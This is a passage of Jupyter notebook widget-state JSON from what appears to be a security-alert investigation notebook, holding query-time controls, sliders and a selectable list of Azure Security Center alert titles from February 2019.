      "model_module_version": "1.4.0",
      "model_name": "HTMLModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description_tooltip": null,
       "layout": "IPY_MODEL_53e5f2a3ae234cd7b85ed592f8021721",
       "style": "IPY_MODEL_7022e1a901d24788990cd1ffc279f91b",
       "value": "<h4>Set query time boundaries</h4>"
      }
     },
     "458559f75d6748adab005ef5516205c6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query start time (UTC):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_cea778f0f9f54851b7cfe63541d7dbed",
       "style": "IPY_MODEL_19fa2411590f4507ba3e9e8caebee8f6",
       "value": "2019-02-10 04:38:41"
      }
     },
     "45b1fa8e96ce47059f87af1b8619af18": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "4602d485e25f437c89dde92f3a41dcb8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "47ac690318bf4c27a766f5e0c0275cdc": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Filter alerts by title:",
       "description_tooltip": null,
       "layout": "IPY_MODEL_2bafe628a09d47869526d77b16af7a1a",
       "style": "IPY_MODEL_4e698b42eb6c4552a7bcfd485ff6938b"
      }
     },
     "484d39972fe34e339c5d5ec9fc585258": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_e101f15966f14bfb9c7268a4c8f93525",
       "max": 10,
       "min": -20,
       "style": "IPY_MODEL_4602d485e25f437c89dde92f3a41dcb8",
       "value": [
        -5,
        1
       ]
      }
     },
     "4ad4f06e556d4d73ab74964d8a5daf41": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "4ba2dc9ca33b4625940e8b7f628b8b2e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_1636cdc955af42ddb935557592db7eef",
        "IPY_MODEL_b1a91d8b131a4ed484516bde422d13a2"
       ],
       "layout": "IPY_MODEL_3c6c46603e94470aa85022f636a376d6"
      }
     },
     "4bf78d6f7c17453fbce6f6e123bc0fcf": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "4ca3ed3ecf204c52ba526c8ac2611334": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "4ce590086476432bb56c27f844754ea1": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "4d46a2df2fe246b5885dd6d793e9d248": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "4d787ec453e44fd3a38320990c3e250d": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_bd3034bd462d481d85cb48de040a71f3",
        "IPY_MODEL_e7070d5ecbf042ec9f6f944300cd0b66",
        "IPY_MODEL_8109812cd0d143c4882a539278540529"
       ],
       "layout": "IPY_MODEL_8a06f70b32ba4e5d894034ceb3837186"
      }
     },
     "4df743745c404b7e91e69e4b23aa7fa1": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "4e698b42eb6c4552a7bcfd485ff6938b": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "4eb89f3babef4832a13f8d306997d2b0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_model_name": "IntRangeSliderModel",
       "_view_module_version": "1.4.0",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (min):",
       "description_tooltip": null,
       "layout": "IPY_MODEL_b89ce84913114df6bd57335caa98c566",
       "min": -600,
       "style": "IPY_MODEL_4df743745c404b7e91e69e4b23aa7fa1",
       "value": [
        -60,
        10
       ]
      }
     },
     "4ecd51a609044669a8e7e3b114b1c7c8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SelectModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_options_labels": [
        "2019-02-09 23:26:48  Security incident with shared process detected (MSTICALERTSWIN1) [id:2518525459919272837_a346dd76-a51d-464e-afc5-c6e5c6a8fc6e]",
        "2019-02-10 00:15:03  Security incident with shared process detected (MSTICALERTSLXVM2) [id:2518525430962829999_c9890374-b912-4db3-b46a-49bf2b6909ab]",
        "2019-02-10 06:15:03  An history file has been cleared (MSTICALERTSLXVM2) [id:2518525214964399999_c0924102-5b0e-4ce1-b9cc-a86c120d8d64]",
        "2019-02-10 06:15:03  Detected Persistence Attempt (MSTICALERTSLXVM2) [id:2518525214967569999_a47c57fe-7a11-4c01-ba8f-2330d3df5475]",
        "2019-02-10 06:15:03  New SSH key added (MSTICALERTSLXVM2) [id:2518525214967399999_99cac885-73ba-4e4c-bb21-3832abac24a4]",
        "2019-02-10 06:15:03  Suspicious binary detected (MSTICALERTSLXVM2) [id:2518525214964729999_974c48bc-7ba0-4576-8e1f-291c480bf6ca]",
        "2019-02-10 06:15:04  Behavior similar to common Linux bots detected (MSTICALERTSLXVM2) [id:2518525214955729999_d8aca12c-c775-43ee-baae-6762660d818e]",
        "2019-02-10 06:15:05  Manipulation of host firewall detected (MSTICALERTSLXVM2) [id:2518525214943369999_93e54825-7b3f-4056-9387-2bdb13717ac9]",
        "2019-02-10 06:15:05  Suspicious Download Then Run Activity (MSTICALERTSLXVM2) [id:2518525214941629999_4fdcf478-5c8a-4e41-b507-8d741f6b8c78]",
        "2019-02-10 06:15:06  Behavior similar to Fairware ransomware detected (MSTICALERTSLXVM2) [id:2518525214938499999_e39808bc-e8d0-441d-8a7d-519e8697e2e0]",
        "2019-02-10 06:15:06  Hidden file execution detected (MSTICALERTSLXVM2) [id:2518525214939229999_8d5bc99e-4381-4188-8632-3588edda47ea]",
        "2019-02-10 06:15:06  Possible credential access tool detected (MSTICALERTSLXVM2) [id:2518525214934099999_49021ec7-ec33-4060-a659-6c90760281c4]",
        "2019-02-10 06:15:07  Detected file download from a known malicious source (MSTICALERTSLXVM2) [id:2518525214922729999_108ca661-69e9-472a-9c19-848a68ab8747]",
        "2019-02-10 06:15:07  Potential overriding of common files (MSTICALERTSLXVM2) [id:2518525214925169999_31132956-57ba-4c9b-948e-1e7cf7b5e6fe]",
        "2019-02-10 06:15:08  Potential reverse shell detected (MSTICALERTSLXVM2) [id:2518525214916029999_125bc04e-e5b7-4cdf-8fe5-e86646eef635]",
        "2019-02-10 06:15:08  Removal of system logs files detected (MSTICALERTSLXVM2) [id:2518525214917029999_f94d4060-e5a7-43c2-a40d-bf5710ce1fb8]",
        "2019-02-10 06:15:09  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518525214904799999_0c4483f3-443a-40dc-9116-93b38b3621be]",
        "2019-02-10 06:15:10  Screenshot taken on host (MSTICALERTSLXVM2) [id:2518525214897769999_73aba7ff-034a-4783-bb49-ce562879ee9d]",
        "2019-02-10 06:15:10  Azure Security Center test alert (not a threat) (MSTICALERTSLXVM2) [id:2518525214893669999_230b65f7-fcf6-4061-8733-f2f05ba5a646]",
        "2019-02-10 12:15:02  New SSH key added (MSTICALERTSLXVM2) [id:2518524998971669999_b7580955-d8b8-459e-be30-40a019ddfc26]",
        "2019-02-10 12:15:02  Detected Persistence Attempt (MSTICALERTSLXVM2) [id:2518524998971829999_5063308b-adac-47ea-92eb-353af07e3604]",
        "2019-02-10 12:15:03  An history file has been cleared (MSTICALERTSLXVM2) [id:2518524998968599999_31b782ad-2d76-4c1e-b1af-96f08faa4883]",
        "2019-02-10 12:15:03  Suspicious binary detected (MSTICALERTSLXVM2) [id:2518524998968899999_48b23636-a357-47b3-918f-f5e4a5131abb]",
        "2019-02-10 12:15:03  Behavior similar to common Linux bots detected (MSTICALERTSLXVM2) [id:2518524998963469999_d3abd2f4-3caa-47c4-a01e-db4265f10600]",
        "2019-02-10 12:15:05  Hidden file execution detected (MSTICALERTSLXVM2) [id:2518524998941029999_510880dd-93be-426d-9230-60369a11f4a9]",
        "2019-02-10 12:15:05  Behavior similar to Fairware ransomware detected (MSTICALERTSLXVM2) [id:2518524998940029999_5230d326-003b-404b-829b-b22506cb7ddb]",
        "2019-02-10 12:15:05  Manipulation of host firewall detected (MSTICALERTSLXVM2) [id:2518524998946299999_22f477a1-0fc7-46e0-820c-426446f3d8c6]",
        "2019-02-10 12:15:05  Suspicious Download Then Run Activity (MSTICALERTSLXVM2) [id:2518524998944099999_9c0cc7cb-f34f-469e-83aa-48ab6f3d4976]",
        "2019-02-10 12:15:06  Possible credential access tool detected (MSTICALERTSLXVM2) [id:2518524998934499999_8e66128b-3873-4213-bf91-b73605c9aaf9]",
        "2019-02-10 12:15:07  Detected file download from a known malicious source (MSTICALERTSLXVM2) [id:2518524998923669999_85f8b110-9056-47cb-ba35-663d775cd444]",
        "2019-02-10 12:15:07  Potential overriding of common files (MSTICALERTSLXVM2) [id:2518524998925699999_5550d6f7-95c3-4265-afe9-68973d4a07ed]",
        "2019-02-10 12:15:08  Potential reverse shell detected (MSTICALERTSLXVM2) [id:2518524998916229999_81aa8e5f-c8e6-42d6-a486-89a4a0ec2247]",
        "2019-02-10 12:15:08  Removal of system logs files detected (MSTICALERTSLXVM2) [id:2518524998917269999_404d6069-abaa-4e1a-b9ff-18c7f36e0bd8]",
        "2019-02-10 12:15:09  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518524998904829999_c1a906f2-8576-4a73-8710-333608826db9]",
        "2019-02-10 12:15:10  Screenshot taken on host (MSTICALERTSLXVM2) [id:2518524998898799999_987bac89-bf73-46cf-a33c-b8c0697d560f]",
        "2019-02-10 12:15:10  Azure Security Center test alert (not a threat) (MSTICALERTSLXVM2) [id:2518524998895729999_f48e2860-7d64-423c-8bd6-93314aefafd1]",
        "2019-02-10 18:15:03  New SSH key added (MSTICALERTSLXVM2) [id:2518524782966399999_a9c6ad15-3e93-411a-974c-6d1cc56d8b18]",
        "2019-02-10 18:15:03  Detected Persistence Attempt (MSTICALERTSLXVM2) [id:2518524782966599999_d6e2baa7-f745-4ed6-b561-9fe81044e58c]",
        "2019-02-10 18:15:03  Suspicious binary detected (MSTICALERTSLXVM2) [id:2518524782963669999_2d6ec33e-19bb-4687-8880-71cb694f6c20]",
        "2019-02-10 18:15:03  An history file has been cleared (MSTICALERTSLXVM2) [id:2518524782963399999_78b2d187-3a41-4271-881c-b9cab18b3421]",
        "2019-02-10 18:15:04  Behavior similar to common Linux bots detected (MSTICALERTSLXVM2) [id:2518524782958399999_1a026c16-321f-4eec-8ecf-05e10e16d123]",
        "2019-02-10 18:15:05  Manipulation of host firewall detected (MSTICALERTSLXVM2) [id:2518524782941629999_b8c42ca0-6c85-4468-af11-2521e2ae93f4]",
        "2019-02-10 18:15:06  Hidden file execution detected (MSTICALERTSLXVM2) [id:2518524782936799999_0f584934-8919-410c-b480-d5625133425a]",
        "2019-02-10 18:15:06  Behavior similar to Fairware ransomware detected (MSTICALERTSLXVM2) [id:2518524782935999999_b6aa8097-ea0d-4cf7-9f74-f2ea317b7f3d]",
        "2019-02-10 18:15:06  Possible credential access tool detected (MSTICALERTSLXVM2) [id:2518524782931329999_714ca0b0-e608-4b90-bd17-f823873f2f47]",
        "2019-02-10 18:15:06  Suspicious Download Then Run Activity (MSTICALERTSLXVM2) [id:2518524782939499999_91a1c219-b5e4-405d-8ce0-03b38e72cd48]",
        "2019-02-10 18:15:07  Potential overriding of common files (MSTICALERTSLXVM2) [id:2518524782921329999_ab779271-88b6-4ed1-a4fb-b4121832fd68]",
        "2019-02-10 18:15:07  Detected file download from a known malicious source (MSTICALERTSLXVM2) [id:2518524782920199999_ce4d6fd7-4179-4b11-80fa-8494b6813f87]",
        "2019-02-10 18:15:08  Potential reverse shell detected (MSTICALERTSLXVM2) [id:2518524782913599999_bc7894e4-7de6-4ed6-8f43-90012ca35ca6]",
        "2019-02-10 18:15:08  Removal of system logs files detected (MSTICALERTSLXVM2) [id:2518524782914669999_684397db-a86b-4403-b959-9bd03ff1c60d]",
        "2019-02-10 18:15:09  Detected suspicious file download (MSTICALERTSLXVM2) [id:2518524782900299999_049f09a3-5d12-4347-8b56-cb987fd71016]",
        "2019-02-10 18:15:10  Screenshot taken on host (MSTICALERTSLXVM2) [id:2518524782894999999_35a30eb4-4ec2-4b0a-be09-507886550925]",
        "2019-02-10 18:15:10  Azure Security Center test alert (not a threat) (MSTICALERTSLXVM2) [id:2518524782892699999_f7fca60a-e081-4449-a146-bb3cd64fbc92]"
       ],
       "_view_module_version": "1.4.0",
       "description": "Select alert :",
       "description_tooltip": null,
       "index": 8,
       "layout": "IPY_MODEL_513a27d7107d458c96659721761e01d0",
       "style": "IPY_MODEL_57c225808de94624a9b8bd541515296c"
      }
     },
     "513a27d7107d458c96659721761e01d0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "height": "300px",
       "width": "95%"
      }
     },
     "52d8b6ec04424d509eb78d328914a3d9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "53782b34830f49afb1b336eafddf8d85": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "537a4d2bb92e459bbe20b61966112014": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_47ac690318bf4c27a766f5e0c0275cdc",
        "IPY_MODEL_e6381d029b7945699006accf194385ce",
        "IPY_MODEL_cf24e0a5c9a44703b2b6895bba77fb03"
       ],
       "layout": "IPY_MODEL_54c2d76a286749a5ace6e7fca7946a99"
      }
     },
     "53e5f2a3ae234cd7b85ed592f8021721": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "54c2d76a286749a5ace6e7fca7946a99": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "552acfd67cd84190b9dfe2f5030403d6": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "height": "300px",
       "width": "95%"
      }
     },
     "560b7376bda04be8973ab6149fb44da8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DatePickerModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Origin Date",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_74fe927ede2041fd80a6503761e0ff23",
       "style": "IPY_MODEL_ac489e6c4b844fe9a8f670b2ebc49519",
       "value": {
        "date": 10,
        "month": 1,
        "year": 2019
       }
      }
     },
     "56210b1d7174438997701b14c4015c6e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "564b39b1e35f4e70a24875dc574512b8": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "57c225808de94624a9b8bd541515296c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "59cbe135ad4d43f1ae02b5b37341cc41": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "5a003bd59ef64ef488c75ed384a7d693": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Time (24hr)",
       "description_tooltip": null,
       "layout": "IPY_MODEL_a6cd20427cfa44aea96f73c110985455",
       "style": "IPY_MODEL_8e92c8bad57d4f1495e0db0eaa7b70fa",
       "value": "21:37:31"
      }
     },
     "5ba436ca9747498db5bc819183a1a57e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "5ced29a773fb489c800c5093adb56742": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "5ddfde8815764a18ab2f4bfb13d91715": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "5e529fbe9fc54ecbbc77fc97c097d383": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "TextModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Query end time (UTC) :  ",
       "description_tooltip": null,
       "layout": "IPY_MODEL_6a8e6475a1c44975a5bfb43ee9802e4d",
       "style": "IPY_MODEL_716191af7d1f444a985d5b93ee3e4cc1",
       "value": "2019-02-11 06:15:06"
      }
     },
     "5e9a96b2502245fab1ccb1669166e608": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "5f0cc2583a6c4d079dd349abf88c8b80": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "5f19de1029d64e0ca057b20ed687f965": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "606376fb63ae4f78918d8e18c4accb37": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "627363c79b0f4546aa4084df06eddb61": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "VBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_3be33d33e12f4d1c80dc7a9af2df532d",
        "IPY_MODEL_34964c6c547047019f309f7b9a003289",
        "IPY_MODEL_2b1e8041097845ec95b1b1f0ad3664b9"
       ],
       "layout": "IPY_MODEL_d63b59d1be914f1bbaf42fa74aa5722b"
      }
     },
     "62c08fbec74f4d73bb6e3f95c0172f3c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": ""
      }
     },
     "6301759162594f0191376cba6b8487f1": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "height": "300px",
       "width": "95%"
      }
     },
     "650fd616ed0f4d28bca94ad60f456897": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "65814959b0aa4e06a381a977ad4dc6a9": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "SliderStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "676ed32027db48a4ac459cfaa8be5a68": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "67c18bc5ec3a43c697914650135b8555": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "CheckboxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "description": "Center subsequent query times round selected Alert?",
       "description_tooltip": null,
       "disabled": false,
       "layout": "IPY_MODEL_fe8a77a4fd294f77b3bd45368a74fb98",
       "style": "IPY_MODEL_bd9a085c387e4dc8b7b06f121c7ef3b8",
       "value": true
      }
     },
     "6824d58b877148f68824f3ef0a0aacf9": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null
      }
     },
     "69973b071105432988e46ef765e03e5c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "HBoxModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.4.0",
       "children": [
        "IPY_MODEL_1a824f44bcf04b3d887a5e610233ca11",
        "IPY_MODEL_bcb162f7f89f4cadb769e4f3bd45b637"
       ],
       "layout": "IPY_MODEL_f0baad13979a45dd974ece436e47eaaa"
      }
     },
     "69aff5ed34ce49c8bd8f3acf0119e16c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.1.0",
      "model_name": "LayoutModel",
      "state": {
       "_model_module_version": "1.1.0",
       "_view_module_version": "1.1.0",
       "grid_area": null,
       "grid_auto_columns": null,
       "grid_auto_flow": null,
       "grid_auto_rows": null,
       "grid_column": null,
       "grid_gap": null,
       "grid_row": null,
       "grid_template_areas": null,
       "grid_template_columns": null,
       "grid_template_rows": null,
       "width": "50%"
      }
     },
     "69de0050962c41eba16f5cf995ac5ab4": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.4.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "_model_module_version": "1.4.0",
       "_view_module_version": "1.1.0",
       "description_width": "initial"
      }
     },
     "6a8e6475a1c44975a5bfb43ee9802e4d": {
      "model_module": "@jupyter-widgets/base",
